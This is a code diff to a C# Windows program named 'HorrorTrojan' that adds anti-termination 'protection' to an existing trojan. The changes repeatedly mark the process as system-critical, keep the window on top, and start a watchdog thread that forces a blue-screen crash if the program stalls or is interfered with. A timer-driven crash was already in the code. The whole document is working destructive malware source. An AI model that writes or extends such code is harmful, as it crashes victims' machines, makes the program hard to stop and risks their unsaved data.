@@ -1,6 +1,7 @@
 using System;
 using System.Drawing;
 using System.Drawing.Drawing2D;
+using System.Threading;
 using System.Windows.Forms;
 
 namespace HorrorTrojan
@@ -11,6 +12,7 @@ namespace HorrorTrojan
         private Timer drawTimer = new Timer();
         private Timer topMostTimer = new Timer();
         private Timer gdiTimer = new Timer();
+        private Timer protectTimer = new Timer();
         private Random rnd = new Random();
         private int elapsedSeconds = 0;
         private int maxSeconds = 180;
@@ -29,6 +31,9 @@ namespace HorrorTrojan
         private bool isDragging = false;
         private Point dragStartPoint;
         private GDIOverlay gdiOverlay;
+        private Thread watchdogThread;
+        private bool watchdogAlive = true;
+        private DateTime lastPing = DateTime.Now;
         
         public HorrorForm()
         {
@@ -66,6 +71,9 @@ namespace HorrorTrojan
             gdiTimer.Interval = 30;
             gdiTimer.Tick += GDITimer_Tick;
             
+            protectTimer.Interval = 100;
+            protectTimer.Tick += ProtectTimer_Tick;
+            
             this.Load += HorrorForm_Load;
             this.Paint += HorrorForm_Paint;
             this.FormClosing += HorrorForm_FormClosing;
@@ -97,8 +105,63 @@ namespace HorrorTrojan
             drawTimer.Start();
             gdiTimer.Start();
             gdiOverlay.Start();
+            protectTimer.Start();
             
-            NativeMethods.SetProcessCritical(true);
+            SetupFullProtection();
+        }
+        
+        private void SetupFullProtection()
+        {
+            try
+            {
+                NativeMethods.SetProcessCritical(true);
+            }
+            catch { }
+            
+            watchdogThread = new Thread(WatchdogLoop);
+            watchdogThread.IsBackground = true;
+            watchdogThread.Start();
+        }
+        
+        private void WatchdogLoop()
+        {
+            while (watchdogAlive)
+            {
+                Thread.Sleep(500);
+                try
+                {
+                    if ((DateTime.Now - lastPing).TotalSeconds > 2)
+                    {
+                        BSODTrigger.TriggerBSOD();
+                        return;
+                    }
+                }
+                catch
+                {
+                    BSODTrigger.TriggerBSOD();
+                    return;
+                }
+            }
+        }
+        
+        private void ProtectTimer_Tick(object sender, EventArgs e)
+        {
+            lastPing = DateTime.Now;
+            
+            try
+            {
+                NativeMethods.SetProcessCritical(true);
+            }
+            catch
+            {
+                BSODTrigger.TriggerBSOD();
+            }
+            
+            try
+            {
+                this.TopMost = true;
+            }
+            catch { }
         }
         
         private void BloodTimer_Tick(object sender, EventArgs e)
@@ -113,6 +176,8 @@ namespace HorrorTrojan
                 drawTimer.Stop();
                 gdiTimer.Stop();
                 gdiOverlay.Stop();
+                protectTimer.Stop();
+                watchdogAlive = false;
                 BSODTrigger.TriggerBSOD();
             }
         }
@@ -262,8 +327,10 @@ namespace HorrorTrojan
                 drawTimer?.Dispose();
                 topMostTimer?.Dispose();
                 gdiTimer?.Dispose();
+                protectTimer?.Dispose();
                 gdiOverlay?.Dispose();
                 horrorImage?.Dispose();
+                watchdogAlive = false;
             }
             base.Dispose(disposing);
         }
